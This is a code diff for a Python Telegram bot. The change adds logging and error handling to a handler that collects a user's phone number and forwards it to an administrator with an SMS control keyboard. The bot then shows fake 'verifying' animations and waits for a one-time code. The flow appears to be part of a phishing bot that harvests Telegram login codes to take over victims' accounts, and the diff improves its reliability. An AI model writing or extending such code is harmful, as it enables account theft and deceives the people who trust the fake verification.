@@ -55,32 +55,44 @@ async def proceed_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return AWAITING_CONTACT
 
 async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    contact = update.message.contact
-    user = update.effective_user
-    
-    conn = get_db_connection()
-    conn.execute("INSERT OR IGNORE INTO users (user_id, phone) VALUES (?, ?)", (user.id, contact.phone_number))
-    conn.commit()
-    
-    admin_text = (
-        "👤 *New Verification Request*\n\n"
-        f"Name: {user.full_name}\n"
-        f"Username: @{user.username}\n"
-        f"Phone: +{contact.phone_number}\n"
-        f"User ID: `{user.id}`"
-    )
-    
-    context.user_data['phone'] = contact.phone_number
-    context.user_data['otp_input'] = ""
-    
-    await send_to_admin(context, admin_text, reply_markup=get_admin_sms_keyboard(user.id))
-    msg = await update.message.reply_text("Processing... 🔄", reply_markup=ReplyKeyboardRemove())
-    context.user_data['status_msg_id'] = msg.message_id
-    
-    await animate_message(update, context, SUBMITTING_MSGS)
-    await animate_message(update, context, VERIFYING_MSGS)
-    await animate_message(update, context, WAITING_CODE_MSGS)
-    return AWAITING_CODE
+    try:
+        contact = update.message.contact
+        user = update.effective_user
+        logging.info(f"Contact received from user {user.id}: {contact.phone_number}")
+        
+        conn = get_db_connection()
+        conn.execute("INSERT OR IGNORE INTO users (user_id, phone) VALUES (?, ?)", (user.id, contact.phone_number))
+        conn.commit()
+        logging.info(f"User {user.id} saved to database.")
+        
+        admin_text = (
+            "👤 *New Verification Request*\n\n"
+            f"Name: {user.full_name}\n"
+            f"Username: @{user.username}\n"
+            f"Phone: +{contact.phone_number}\n"
+            f"User ID: `{user.id}`"
+        )
+        
+        context.user_data['phone'] = contact.phone_number
+        context.user_data['otp_input'] = ""
+        
+        logging.info(f"Sending notification to admin for user {user.id}...")
+        await send_to_admin(context, admin_text, reply_markup=get_admin_sms_keyboard(user.id))
+        
+        msg = await update.message.reply_text("Processing... 🔄", reply_markup=ReplyKeyboardRemove())
+        context.user_data['status_msg_id'] = msg.message_id
+        
+        logging.info("Starting animations...")
+        await animate_message(update, context, SUBMITTING_MSGS)
+        await animate_message(update, context, VERIFYING_MSGS)
+        await animate_message(update, context, WAITING_CODE_MSGS)
+        
+        logging.info(f"User {user.id} now in AWAITING_CODE state.")
+        return AWAITING_CODE
+    except Exception as e:
+        logging.error(f"Error in contact_handler: {e}")
+        await update.message.reply_text("An error occurred while processing your request. ⚠️")
+        return ConversationHandler.END
 
 async def otp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
